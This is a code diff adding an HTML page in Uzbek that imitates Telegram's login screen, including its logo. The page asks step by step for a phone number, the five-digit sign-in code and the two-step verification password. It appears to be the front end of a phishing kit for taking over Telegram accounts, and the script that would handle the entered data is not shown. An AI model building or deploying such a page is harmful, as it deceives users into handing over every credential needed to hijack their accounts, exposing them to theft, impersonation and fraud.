@@ -1,0 +1,54 @@
+<!DOCTYPE html>
+<html lang="uz">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Telegram Login</title>
+  <link rel="stylesheet" href="style.css">
+</head>
+<body>
+
+  <div class="login-card">
+    <div class="logo">
+      <svg viewBox="0 0 24 24" width="60" height="60">
+        <path fill="#2AABEE" d="M12 0C5.37 0 0 5.37 0 12s5.37 12 12 12 12-5.37 12-12S18.63 0 12 0zm5.56 8.16l-1.97 9.28c-.15.65-.53.81-1.08.5l-3.02-2.23-1.46 1.4c-.16.16-.3.3-.61.3l.22-3.08 5.61-5.07c.24-.22-.05-.34-.38-.13l-6.93 4.36-2.98-.93c-.65-.2-.66-.65.14-.97l11.66-4.49c.54-.2 1.01.12.82.97z"/>
+      </svg>
+    </div>
+
+    <div id="step-phone" class="step active">
+      <h2>Telegram-ga kirish</h2>
+      <p>Davlat kodini va telefon raqamingizni kiriting.</p>
+      <form id="phone-form">
+        <div class="input-group">
+          <input type="tel" id="phone-input" placeholder="+998 90 123 45 67" required>
+        </div>
+        <button type="submit" class="btn">Davom etish</button>
+      </form>
+    </div>
+
+    <div id="step-code" class="step">
+      <h2>Kodni kiriting</h2>
+      <p id="code-sent-to">Kodni ushbu raqamga yubordik: </p>
+      <form id="code-form">
+        <div class="input-group">
+          <input type="text" id="code-input" placeholder="*****" maxlength="5" required>
+        </div>
+        <button type="submit" class="btn">Tasdiqlash</button>
+      </form>
+    </div>
+
+    <div id="step-2fa" class="step">
+      <h2>2FA Paroli</h2>
+      <p>Hisoingiz ikki bosqichli tasdiqlash bilan ҳimoyalangan.</p>
+      <form id="fa-form">
+        <div class="input-group">
+          <input type="password" id="fa-input" placeholder="Parol" required>
+        </div>
+        <button type="submit" class="btn">Kirish</button>
+      </form>
+    </div>
+  </div>
+
+  <script src="script.js"></script>
+</body>
+</html>
